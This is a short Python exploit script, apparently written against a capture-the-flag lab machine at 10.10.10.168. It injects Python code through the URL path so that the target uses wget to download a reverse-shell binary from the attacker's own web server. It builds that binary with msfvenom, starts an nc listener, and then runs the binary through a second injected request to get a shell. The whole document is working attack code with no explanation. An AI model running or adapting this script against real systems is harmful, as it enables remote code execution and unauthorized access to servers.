#!/usr/bin/python3

import sys
import os
import requests
import subprocess
import threading
from time import sleep
from http.server import HTTPServer, SimpleHTTPRequestHandler


def start_listener(LPORT):
    return subprocess.Popen('nc -nvlp ' + LPORT, shell=True).stdin

def up(thread):
    thread.start()
    sleep(2)

def down(webserver):
    webserver.shutdown()

def print_status(message):
    print(f"----------------------------------------\n{message}\n----------------------------------------\n")
    
if len(sys.argv) < 3:
    print(f"Usage: {sys.argv[0]} host-address listener-port")
    sys.exit()


HOST_ADDRESS = sys.argv[1]
HOST_PORT = 80
LIST_PORT = sys.argv[2]
target = "http://10.10.10.168:8080/"
payload1 = f"'; os.system(\"wget http://{HOST_ADDRESS}/rshell -O /tmp/rshell; chmod +x /tmp/rshell\");'"
payload2 = "'; os.system(\"/tmp/rshell\");'"

print_status("Starting up the local web server...")
webserver = HTTPServer((HOST_ADDRESS, HOST_PORT), SimpleHTTPRequestHandler)
thread1 = threading.Thread(target=webserver.serve_forever)
thread1.daemon = True
up(thread1)
print_status("Local web server started")

print_status("Creating a payload...")
os.system('msfvenom -p linux/x64/shell_reverse_tcp LHOST=' + HOST_ADDRESS + ' LPORT=' + LIST_PORT + ' -f elf -o rshell')
print_status("Payload created")

print_status(f"Started listener on port {LIST_PORT}")
listener = start_listener(LIST_PORT)
sleep(2)
print_status("Listener started")

print_status("Sending the payload and \nshutting down the webserver...")
requests.get(url=(target + payload1))
down(webserver)
print_status("Payload sent, check for a shell.\nDon't Ctrl+C out.\nType 'exit' instead")

requests.get(url=(target + payload2))

listener.communicate()
